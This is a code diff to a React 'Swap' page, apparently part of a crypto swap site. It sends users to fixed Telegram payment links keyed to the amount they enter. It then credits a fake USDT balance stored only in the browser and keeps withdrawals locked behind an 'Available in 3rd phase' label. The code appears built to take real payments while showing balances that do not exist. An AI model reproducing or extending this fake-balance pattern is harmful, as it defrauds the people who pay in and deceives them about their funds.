@@ -8,11 +8,13 @@ import swapImage from "./8482621.png";
 
 const Swap = () => {
   const { contextData } = useContext(UserContext);
-  const { balance } = contextData;
+  const { balance, setBalance } = contextData;
   const [inputValue, setInputValue] = useState("");
   const [usdtValue, setUsdtValue] = useState("");
   const [isIconColored, setIsIconColored] = useState(false);
-  const usdtBalance = 0;
+  const usdtBalance = localStorage.getItem("usdtBalance")
+    ? parseFloat(localStorage.getItem("usdtBalance"))
+    : 0;
   const usdt = 0.9149;
   const links = [
     "https://t.me/send?start=IVOEwneDUsCU",
@@ -25,7 +27,6 @@ const Swap = () => {
     "https://t.me/send?start=IVOrcEdGXulS",
     "https://t.me/send?start=IVmRXsQQHWJT",
   ];
-  
 
   // Функция для определения fee
   const calculateFee = () => {
@@ -123,6 +124,26 @@ const Swap = () => {
     }
   };
 
+  const swapUsdt = () => {
+    // Проверяем, что inputValue и usdtValue являются числами
+    const parsedInputValue = parseFloat(inputValue);
+    const parsedUsdtValue = parseFloat(usdtValue);
+
+    // Если не удалось распарсить значения, выходим из функции
+    if (isNaN(parsedInputValue) || isNaN(parsedUsdtValue)) {
+      return;
+    }
+
+    // Вычисляем новое значение для usdtBalance
+    const newUsdtBalance = parsedUsdtValue + usdtBalance;
+
+    // Обновляем localStorage с новым значением usdtBalance
+    localStorage.setItem("usdtBalance", newUsdtBalance.toFixed(6));
+
+    // Обновляем состояние balance, учитывая inputValue
+    setBalance((prevBalance) => prevBalance - parsedInputValue);
+  };
+
   // Функция для проверки, должна ли кнопка быть активной или нет
   const isButtonDisabled = () => {
     // Кнопка должна быть неактивной, если одно из полей пустое или inputValue больше balance
@@ -185,7 +206,9 @@ const Swap = () => {
             const link = getLinkByInputValue();
             if (link) {
               window.location.href = link;
+              
             }
+            setTimeout(swapUsdt, 150);
           }
         }}
       />
@@ -218,14 +241,14 @@ const Swap = () => {
         </p>
       </div>
 
-      <div class="area">
+      <div className="area">
         <textarea
           id="areaInput"
           placeholder="Введите адрес для вывода"
-          class="area-in"
+          className="area-in"
         ></textarea>
-        <button id="submitButton" disabled>
-          Insufficient funds
+        <button id="submitButton" disabled={usdtBalance === 0}>
+          {usdtBalance === 0 ? "Insufficient funds" : "Available in 3rd phase"}
         </button>
       </div>
 
